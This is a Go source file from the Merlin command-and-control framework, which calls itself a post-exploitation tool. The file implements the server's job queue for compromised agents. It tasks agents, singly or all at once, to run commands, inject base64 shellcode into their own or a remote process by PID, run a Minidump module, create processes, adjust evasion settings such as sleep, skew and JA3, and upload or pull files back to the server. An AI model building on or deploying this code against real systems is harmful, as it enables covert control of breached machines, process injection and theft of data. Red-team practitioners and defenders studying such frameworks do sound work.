// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package jobs

// TODO Does it makes sense to move this under pkg/agents/jobs?

import (
	// Standard
	"crypto/sha256"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"time"

	// 3rd Party
	"github.com/fatih/color"
	uuid "github.com/satori/go.uuid"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agents"
	messageAPI "github.com/Ne0nd0g/merlin/pkg/api/messages"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// init registers message types with gob that are an interface for Base.Payload
func init() {
	gob.Register([]Job{})
	gob.Register(Command{})
	gob.Register(Shellcode{})
	gob.Register(FileTransfer{})
	gob.Register(Results{})
}

const (
	CREATED  = 1
	SENT     = 2
	RETURNED = 3 // For when job will send back chunked messages and hasn't finished
	COMPLETE = 4
	CANCELED = 5 // Jobs that were cancelled with the "clear" command

	// To Agent
	CMD          = 10 // CmdPayload
	CONTROL      = 11 // AgentControl
	SHELLCODE    = 12 // Shellcode
	NATIVE       = 13 // NativeCmd
	FILETRANSFER = 14 // FileTransfer
	OK           = 15 // ServerOK
	MODULE       = 16 // Module

	// From Agent
	RESULT    = 20
	AGENTINFO = 21
)

var JobsChannel = make(map[uuid.UUID]chan Job)
var Jobs = make(map[string]info)

// Job is used to task an agent to run a command
type Job struct {
	AgentID uuid.UUID   // ID of the agent the job belong to
	ID      string      // Unique identifier for each job
	Token   uuid.UUID   // A unique token for each task that acts like a CSRF token to prevent multiple job messages
	Type    int         // The type of job it is (e.g., FileTransfer
	Payload interface{} // Embedded messages of various types
}

//  info is a structure for holding data for single task assigned to a single agent
type info struct {
	AgentID   uuid.UUID // ID of the agent the job belong to
	Type      string    // Type of job
	Token     uuid.UUID // A unique token for each task that acts like a CSRF token to prevent multiple job messages
	Status    int       // Use JOB_ constants
	Chunk     int       // The chunk number
	Created   time.Time // Time the job was created
	Sent      time.Time // Time the job was sent to the agent
	Completed time.Time // Time the job finished
}

// Command is the structure to send a task for the agent to execute
type Command struct {
	Command string   `json:"command"`
	Args    []string `json:"args"`
}

// Shellcode is a JSON payload containing shellcode and the method for execution
type Shellcode struct {
	Method string `json:"method"`
	Bytes  string `json:"bytes"`         // Base64 string of shellcode bytes
	PID    uint32 `json:"pid,omitempty"` // Process ID for remote injection
}

// FileTransfer is the JSON payload to transfer files between the server and agent
type FileTransfer struct {
	FileLocation string `json:"dest"`
	FileBlob     string `json:"blob"`
	IsDownload   bool   `json:"download"`
}

// Results is a JSON payload that contains the results of an executed command from an agent
type Results struct {
	Stdout string `json:"stdout"`
	Stderr string `json:"stderr"`
}

// Add creates a job and adds it to the specified agent's job channel
func Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
	// TODO turn this into a method of the agent struct
	if core.Debug {
		message("debug", fmt.Sprintf("In jobs.Job function for agent: %s", agentID.String()))
		message("debug", fmt.Sprintf("In jobs.Add function for type: %s, arguments: %v", jobType, jobType))
	}

	agent, ok := agents.Agents[agentID]
	if !ok {
		return "", fmt.Errorf("%s is not a valid agent", agentID)
	}

	var job Job

	switch jobType {
	case "agentInfo":
		job.Type = CONTROL
		job.Payload = Command{
			Command: "agentInfo",
		}
	case "cmd":
		job.Type = CMD
		payload := Command{
			Command: jobArgs[0],
		}
		if len(jobArgs) > 1 {
			payload.Args = jobArgs[1:]
		}
		job.Payload = payload
	case "shellcode":
		job.Type = SHELLCODE
		payload := Shellcode{
			Method: jobArgs[0],
		}

		if payload.Method == "self" {
			payload.Bytes = jobArgs[1]
		} else if payload.Method == "remote" || payload.Method == "rtlcreateuserthread" || payload.Method == "userapc" {
			i, err := strconv.Atoi(jobArgs[1])
			if err != nil {
				return "", err
			}
			payload.PID = uint32(i)
			payload.Bytes = jobArgs[2]
		}
		job.Payload = payload
	case "download":
		job.Type = FILETRANSFER
		agent.Log(fmt.Sprintf("Downloading file from agent at %s\n", jobArgs[0]))

		p := FileTransfer{
			FileLocation: jobArgs[0],
			IsDownload:   false,
		}
		job.Payload = p
	case "initialize":
		job.Type = CONTROL
		p := Command{
			Command: jobType,
		}
		job.Payload = p
	case "kill":
		job.Type = CONTROL
		p := Command{
			Command: jobArgs[0], // TODO, this should be in jobType position
		}
		job.Payload = p
	case "ls":
		job.Type = NATIVE
		p := Command{
			Command: "ls", // TODO This should be in the jobType position
		}

		if len(jobArgs) > 0 {
			p.Args = jobArgs[0:]
		} else {
			p.Args = []string{"./"}
		}
		job.Payload = p
	case "killdate":
		job.Type = CONTROL
		p := Command{
			Command: jobArgs[0],
		}
		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "cd":
		job.Type = NATIVE
		p := Command{
			Command: "cd",
			Args:    jobArgs[0:],
		}
		job.Payload = p
	case "pwd":
		job.Type = NATIVE
		p := Command{
			Command: jobArgs[0], // TODO This should be in the jobType position
		}
		job.Payload = p
	case "maxretry":
		job.Type = CONTROL
		p := Command{
			Command: jobArgs[0], // TODO This should be in the jobType postion
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "padding":
		job.Type = CONTROL
		p := Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "skew":
		job.Type = CONTROL
		p := Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "sleep":
		job.Type = CONTROL
		p := Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "ja3":
		job.Type = CONTROL
		p := Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "Minidump":
		job.Type = MODULE
		p := Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "CreateProcess":
		job.Type = MODULE
		p := Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "upload":
		job.Type = FILETRANSFER
		if len(jobArgs) < 2 {
			return "", fmt.Errorf("expected 2 arguments for upload command, recieved %d", len(jobArgs))
		}
		uploadFile, uploadFileErr := ioutil.ReadFile(jobArgs[0])
		if uploadFileErr != nil {
			// TODO send "ServerOK"
			return "", fmt.Errorf("there was an error reading %s: %v", job.Type, uploadFileErr)
		}
		fileHash := sha256.New()
		_, err := io.WriteString(fileHash, string(uploadFile))
		if err != nil {
			message("warn", fmt.Sprintf("There was an error generating file hash:\r\n%s", err.Error()))
		}
		agent.Log(fmt.Sprintf("Uploading file from server at %s of size %d bytes and SHA-256: %x to agent at %s",
			jobArgs[0],
			len(uploadFile),
			fileHash.Sum(nil),
			jobArgs[1]))

		p := FileTransfer{
			FileLocation: jobArgs[1],
			FileBlob:     base64.StdEncoding.EncodeToString([]byte(uploadFile)),
			IsDownload:   true,
		}
		job.Payload = p
	default:
		return "", fmt.Errorf("invalid job type: %d", job.Type)
	}

	// If the Agent is set to broadcast identifier for ALL agents
	if ok || agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff" {
		if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff" {
			if len(agents.Agents) <= 0 {
				return "", fmt.Errorf("there are 0 available agents, no jobs were created")
			}
			for a := range agents.Agents {
				// Fill out remaining job fields
				token := uuid.NewV4()
				job.ID = core.RandStringBytesMaskImprSrc(10)
				job.Token = token
				job.AgentID = a
				// Add job to the channel
				_, k := JobsChannel[agentID]
				if !k {
					JobsChannel[agentID] = make(chan Job, 100)
				}
				JobsChannel[agentID] <- job
				//agents.Agents[a].JobChannel <- job
				// Add job to the list
				Jobs[job.ID] = info{
					AgentID: a,
					Token:   token,
					Type:    String(job.Type),
					Status:  CREATED,
					Created: time.Now().UTC(),
				}
				// Log the job
				agent.Log(fmt.Sprintf("Created job Type:%s, ID:%s, Status:%s, Args:%s",
					messages.String(job.Type),
					job.ID,
					"Created",
					jobArgs))
			}
			return job.ID, nil
		}
		// A single Agent
		token := uuid.NewV4()
		job.Token = token
		job.ID = core.RandStringBytesMaskImprSrc(10)
		job.AgentID = agentID
		// Add job to the channel
		//agents.Agents[agentID].JobChannel <- job
		_, k := JobsChannel[agentID]
		if !k {
			JobsChannel[agentID] = make(chan Job, 100)
		}
		JobsChannel[agentID] <- job
		// Add job to the list
		Jobs[job.ID] = info{
			AgentID: agentID,
			Token:   token,
			Type:    String(job.Type),
			Status:  CREATED,
			Created: time.Now().UTC(),
		}
		// Log the job
		agent.Log(fmt.Sprintf("Created job Type:%s, ID:%s, Status:%s, Args:%s",
			messages.String(job.Type),
			job.ID,
			"Created",
			jobArgs))
	}
	return job.ID, nil
}

// Clear removes any jobs the queue that have been created, but NOT sent to the agent
func Clear(agentID uuid.UUID) error {
	if core.Debug {
		message("debug", "Entering into jobs.Clear() function...")
	}

	_, ok := agents.Agents[agentID]
	if !ok {
		return fmt.Errorf("%s is not a valid agent", agentID)
	}

	// Empty the job channel
	jobChannel, k := JobsChannel[agentID]
	if !k {
		// There was not a jobs channel for this agent
		return nil
	}
	jobLength := len(jobChannel)
	if jobLength > 0 {
		for i := 0; i < jobLength; i++ {
			job := <-jobChannel
			// Update Job Info structure
			j, ok := Jobs[job.ID]
			if ok {
				j.Status = CANCELED
				Jobs[job.ID] = j
			} else {
				return fmt.Errorf("invalid job %s for agent %s", job.ID, agentID)
			}
			if core.Debug {
				message("debug", fmt.Sprintf("Channel command string: %+v", job))
				message("debug", fmt.Sprintf("Job type: %s", messages.String(job.Type)))
			}
		}
	}
	return nil
}

// Get returns a list of jobs that need to be sent to the agent
func Get(agentID uuid.UUID) ([]Job, error) {
	if core.Debug {
		message("debug", "Entering into jobs.Get() function...")
	}
	var jobs []Job
	_, ok := agents.Agents[agentID]
	if !ok {
		return jobs, fmt.Errorf("%s is not a valid agent", agentID)
	}

	jobChannel, k := JobsChannel[agentID]
	if !k {
		// There was not a jobs channel for this agent
		return jobs, nil
	}

	// Check to see if there are any jobs
	jobLength := len(jobChannel)
	if jobLength > 0 {
		for i := 0; i < jobLength; i++ {
			job := <-jobChannel
			jobs = append(jobs, job)
			// Update Job Info map
			j, ok := Jobs[job.ID]
			if ok {
				j.Status = SENT
				j.Sent = time.Now().UTC()
				Jobs[job.ID] = j
			} else {
				return jobs, fmt.Errorf("invalid job %s for agent %s", job.ID, agentID)
			}
			if core.Debug {
				message("debug", fmt.Sprintf("Channel command string: %+v", job))
				message("debug", fmt.Sprintf("Job type: %s", String(job.Type)))
			}
		}
	}
	if core.Debug {
		message("debug", fmt.Sprintf("Returning jobs:\r\n%+v", jobs))
	}
	return jobs, nil
}

// Handler evaluates a message sent in by the agent and the subsequently executes any corresponding tasks
func Handler(m messages.Base) (messages.Base, error) {
	if core.Debug {
		message("debug", "Entering into jobs.Handle() function...")
		message("debug", fmt.Sprintf("Input message: %+v", m))
	}

	returnMessage := messages.Base{
		ID:      m.ID,
		Version: 1.0,
	}

	if m.Type != messages.JOBS {
		return returnMessage, fmt.Errorf("invalid message type: %s for job handler", messages.String(m.Type))
	}
	jobs := m.Payload.([]Job)
	a, ok := agents.Agents[m.ID]
	if !ok {
		return returnMessage, fmt.Errorf("%s is not a valid agent", m.ID)
	}

	a.StatusCheckIn = time.Now().UTC()
	returnMessage.Padding = core.RandStringBytesMaskImprSrc(a.PaddingMax)

	var returnJobs []Job

	for _, job := range jobs {
		// Check to make sure agent UUID is in dataset
		agent, ok := agents.Agents[job.AgentID]
		if ok {
			// Verify that the job contains the correct token and that it was not already completed
			err := checkJob(job)
			if err != nil {
				// Agent will send back error messages that are not the result of a job
				if job.Type != RESULT {
					return returnMessage, err
				} else {
					if core.Debug {
						message("debug", fmt.Sprintf("Received %s message without job token.\r\n%s", messages.String(job.Type), err))
					}
				}
			}
			switch job.Type {
			case RESULT:
				agent.Log(fmt.Sprintf("Results for job: %s", job.ID))

				userMessage := messageAPI.UserMessage{
					Level:   messageAPI.Note,
					Time:    time.Now().UTC(),
					Message: fmt.Sprintf("Results job %s for agent %s at %s", job.ID, job.AgentID, time.Now().UTC().Format(time.RFC3339)),
				}
				messageAPI.SendBroadcastMessage(userMessage)
				result := job.Payload.(Results)
				if len(result.Stdout) > 0 {
					agent.Log(fmt.Sprintf("Command Results (stdout):\r\n%s", result.Stdout))
					userMessage := messageAPI.UserMessage{
						Level:   messageAPI.Success,
						Time:    time.Now().UTC(),
						Message: result.Stdout,
					}
					messageAPI.SendBroadcastMessage(userMessage)
				}
				if len(result.Stderr) > 0 {
					agent.Log(fmt.Sprintf("Command Results (stderr):\r\n%s", result.Stderr))
					userMessage := messageAPI.UserMessage{
						Level:   messageAPI.Warn,
						Time:    time.Now().UTC(),
						Message: result.Stderr,
					}
					messageAPI.SendBroadcastMessage(userMessage)
				}
			case AGENTINFO:
				agent.UpdateInfo(job.Payload.(messages.AgentInfo))
			case FILETRANSFER:
				err := fileTransfer(job.AgentID, job.Payload.(FileTransfer))
				if err != nil {
					return returnMessage, err
				}
			}
			// Update Jobs Info structure
			j, k := Jobs[job.ID]
			if k {
				j.Status = COMPLETE
				j.Completed = time.Now().UTC()
				Jobs[job.ID] = j
			}
		} else {
			userMessage := messageAPI.UserMessage{
				Level:   messageAPI.Warn,
				Time:    time.Now().UTC(),
				Message: fmt.Sprintf("Job %s was for an invalid agent %s", job.ID, job.AgentID),
			}
			messageAPI.SendBroadcastMessage(userMessage)
		}
	}
	// See if there are any new jobs to send back
	agentJobs, err := Get(m.ID)
	if err != nil {
		return returnMessage, err
	}
	returnJobs = append(returnJobs, agentJobs...)

	if len(returnJobs) > 0 {
		returnMessage.Type = messages.JOBS
		returnMessage.Payload = returnJobs
	} else {
		returnMessage.Type = messages.IDLE
	}

	if core.Debug {
		message("debug", fmt.Sprintf("Message that will be returned to the Agent:\r\n%+v", returnMessage))
		message("debug", "Leaving jobs.Handle() function...")
	}
	return returnMessage, nil
}

// Idle handles input idle messages from the agent and checks to see if there are any jobs to return
func Idle(agentID uuid.UUID) (messages.Base, error) {
	returnMessage := messages.Base{
		ID:      agentID,
		Version: 1.0,
	}
	agent, ok := agents.Agents[agentID]
	if !ok {
		return returnMessage, fmt.Errorf("%s is not a valid agent", agentID)
	}

	if core.Verbose || core.Debug {
		message("success", fmt.Sprintf("Received agent status checkin from %s", agentID))
	}

	agent.StatusCheckIn = time.Now().UTC()
	returnMessage.Padding = core.RandStringBytesMaskImprSrc(agent.PaddingMax)
	// See if there are any new jobs to send back
	jobs, err := Get(agentID)
	if err != nil {
		return returnMessage, err
	}
	if len(jobs) > 0 {
		returnMessage.Type = messages.JOBS
		returnMessage.Payload = jobs
	} else {
		returnMessage.Type = messages.IDLE
	}
	return returnMessage, nil
}

// GetTableActive returns a list of rows that contain information about active jobs
func GetTableActive(agentID uuid.UUID) ([][]string, error) {
	if core.Debug {
		message("debug", fmt.Sprintf("entering into jobs.GetTableActive for agent %s", agentID.String()))
	}
	var jobs [][]string
	_, ok := agents.Agents[agentID]
	if !ok {
		return jobs, fmt.Errorf("%s is not a valid agent", agentID)
	}

	for id, job := range Jobs {
		if job.AgentID == agentID {
			//message("debug", fmt.Sprintf("GetTableActive(%s) ID: %s, Job: %+v", agentID.String(), id, job))
			var status string
			switch job.Status {
			case CREATED:
				status = "Created"
			case SENT:
				status = "Sent"
			case RETURNED:
				status = "Returned"
			default:
				status = fmt.Sprintf("Unknown job status: %d", job.Status)
			}
			var zeroTime time.Time
			// Don't add completed or canceled jobs
			if job.Status != COMPLETE && job.Status != CANCELED {
				var sent string
				if job.Sent != zeroTime {
					sent = job.Sent.Format(time.RFC3339)
				}
				// <JobID>, <JobStatus>, <JobType>, <Created>, <Sent>
				jobs = append(jobs, []string{
					id,
					status,
					job.Type,
					job.Created.Format(time.RFC3339),
					sent,
				})
			}
		}
	}
	return jobs, nil
}

// checkJob verifies that the input job message contains the expected token and was not already completed
func checkJob(job Job) error {
	// Check to make sure agent UUID is in dataset
	_, ok := agents.Agents[job.AgentID]
	if !ok {
		return fmt.Errorf("job %s was for an invalid agent %s", job.ID, job.AgentID)
	}
	j, k := Jobs[job.ID]
	if !k {
		return fmt.Errorf("job %s was not found for agent %s", job.ID, job.AgentID)
	}
	if job.Token != j.Token {
		return fmt.Errorf("job %s for agent %s did not contain the correct token.\r\nExpected: %s, Got: %s", job.ID, job.AgentID, j.Token, job.Token)
	}
	if j.Status == COMPLETE {
		return fmt.Errorf("job %s for agent %s was previously completed on %s", job.ID, job.AgentID, j.Completed.UTC().Format(time.RFC3339))
	}
	if j.Status == CANCELED {
		return fmt.Errorf("job %s for agent %s was previously canceled on", job.ID, job.AgentID)
	}
	return nil
}

// fileTransfer handles file upload/download operations
func fileTransfer(agentID uuid.UUID, p FileTransfer) error {
	if core.Debug {
		message("debug", "Entering into agents.FileTransfer")
	}

	// Check to make sure it is a known agent
	agent, ok := agents.Agents[agentID]
	if !ok {
		return fmt.Errorf("%s is not a valid agent", agentID)
	}

	if p.IsDownload {
		agentsDir := filepath.Join(core.CurrentDir, "data", "agents")
		_, f := filepath.Split(p.FileLocation) // We don't need the directory part for anything
		if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
			errorMessage := fmt.Errorf("there was an error locating the agent's directory:\r\n%s", errD.Error())
			agent.Log(errorMessage.Error())
			return errorMessage
		}
		message("success", fmt.Sprintf("Results for %s at %s", agentID, time.Now().UTC().Format(time.RFC3339)))
		downloadBlob, downloadBlobErr := base64.StdEncoding.DecodeString(p.FileBlob)

		if downloadBlobErr != nil {
			errorMessage := fmt.Errorf("there was an error decoding the fileBlob:\r\n%s", downloadBlobErr.Error())
			agent.Log(errorMessage.Error())
			return errorMessage
		}
		downloadFile := filepath.Join(agentsDir, agentID.String(), f)
		writingErr := ioutil.WriteFile(downloadFile, downloadBlob, 0600)
		if writingErr != nil {
			errorMessage := fmt.Errorf("there was an error writing to -> %s:\r\n%s", p.FileLocation, writingErr.Error())
			agent.Log(errorMessage.Error())
			return errorMessage
		}
		successMessage := fmt.Sprintf("Successfully downloaded file %s with a size of %d bytes from agent %s to %s",
			p.FileLocation,
			len(downloadBlob),
			agentID.String(),
			downloadFile)

		message("success", successMessage)
		agent.Log(successMessage)
	}
	if core.Debug {
		message("debug", "Leaving agents.FileTransfer")
	}
	return nil
}

// String returns the text representation of a message constant
func String(jobType int) string {
	switch jobType {
	case CMD:
		return "Command"
	case CONTROL:
		return "AgentControl"
	case SHELLCODE:
		return "Shellcode"
	case NATIVE:
		return "Native"
	case FILETRANSFER:
		return "FileTransfer"
	case OK:
		return "ServerOK"
	case MODULE:
		return "Module"
	case RESULT:
		return "Result"
	case AGENTINFO:
		return "AgentInfo"
	default:
		return fmt.Sprintf("Invalid job type: %d", jobType)
	}
}

// message is used to send send messages to STDOUT where the server is running and not intended to be sent to CLI
func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}
